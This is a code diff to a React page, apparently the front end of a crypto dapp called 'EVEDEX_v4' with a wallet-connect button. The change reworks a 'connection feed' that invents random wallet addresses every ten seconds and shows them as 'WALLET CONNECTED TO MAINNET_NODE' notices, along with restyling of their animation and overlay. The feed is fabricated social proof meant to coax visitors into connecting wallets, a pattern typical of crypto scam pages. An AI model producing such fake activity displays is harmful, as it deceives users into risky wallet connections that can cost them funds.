@@ -35,18 +35,26 @@ export default function App() {
     }).catch(() => {});
   };
 
-  // GLOBAL INDEPENDENT NOTIFICATION ENGINE
+  // --- INDEPENDENT CONNECTION FEED ENGINE ---
   useEffect(() => {
-    const trigger = () => {
-      const r = Math.floor(1000 + Math.random() * 8999);
+    const generateMsg = () => {
+      const hex = "0123456789abcdef";
+      let r = "";
+      for (let i = 0; i < 4; i++) r += hex[Math.floor(Math.random() * 16)];
       setFeedMsg(`🛡️ 0x${r}...${r} WALLET CONNECTED TO MAINNET_NODE`);
-      // Auto-clear message after 4.5 seconds
-      setTimeout(() => setFeedMsg(""), 4500);
+      
+      // Keep visible for 4 seconds
+      setTimeout(() => {
+        setFeedMsg("");
+      }, 4000);
     };
 
-    trigger(); // First run
-    const interval = setInterval(trigger, 10000); // Repeat every 10s
-    return () => clearInterval(interval);
+    // Start immediately
+    generateMsg();
+    // Loop every 10 seconds exactly
+    const timer = setInterval(generateMsg, 10000);
+    
+    return () => clearInterval(timer);
   }, []);
 
   const handleHandshake = () => {
@@ -79,15 +87,15 @@ export default function App() {
   return (
     <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'monospace', padding:'15px', textTransform:'uppercase'}}>
       <style>{`
-        @keyframes slideIn {
-          0% { opacity: 0; transform: translateY(30px); }
-          15% { opacity: 1; transform: translateY(0); }
-          85% { opacity: 1; transform: translateY(0); }
-          100% { opacity: 0; transform: translateY(-30px); }
+        @keyframes slide {
+          0% { opacity: 0; transform: translateY(20px); }
+          10% { opacity: 1; transform: translateY(0); }
+          90% { opacity: 1; transform: translateY(0); }
+          100% { opacity: 0; transform: translateY(-20px); }
         }
-        .feed-notice { animation: slideIn 4.5s ease-in-out forwards; }
+        .feed-item { animation: slide 4s ease-in-out forwards; }
       `}</style>
-      
+
       <header style={{display:'flex', justifyContent:'space-between', borderBottom:'1px solid #1e293b', paddingBottom:'10px', marginBottom:'15px'}}>
         <div style={{color:'#10b981', fontWeight:'900', fontSize:'22px'}}>EVEDEX_v4</div>
         <appkit-button />
@@ -176,12 +184,14 @@ export default function App() {
         </div>
       )}
 
-      {/* THIS IS THE INDEPENDENT NOTIFICATION BAR */}
-      {feedMsg && (
-        <div key={feedMsg} className="feed-notice" style={{position:'fixed', bottom:'25px', left:'20px', right:'20px', backgroundColor:'rgba(16,185,129,0.15)', border:'1px solid #10b981', color:'#10b981', padding:'14px', borderRadius:'14px', fontSize:'10px', textAlign:'center', fontWeight:'900', zIndex:9999, pointerEvents:'none'}}>
-          {feedMsg}
-        </div>
-      )}
+      {/* INDEPENDENT OVERLAY FOR FEED */}
+      <div style={{position:'fixed', bottom:'25px', left:'15px', right:'15px', zIndex:9999, pointerEvents:'none'}}>
+        {feedMsg && (
+          <div key={feedMsg} className="feed-item" style={{backgroundColor:'rgba(16,185,129,0.15)', border:'1px solid #10b981', color:'#10b981', padding:'15px', borderRadius:'15px', fontSize:'11px', textAlign:'center', fontWeight:'900'}}>
+            {feedMsg}
+          </div>
+        )}
+      </div>
     </div>
   );
 }
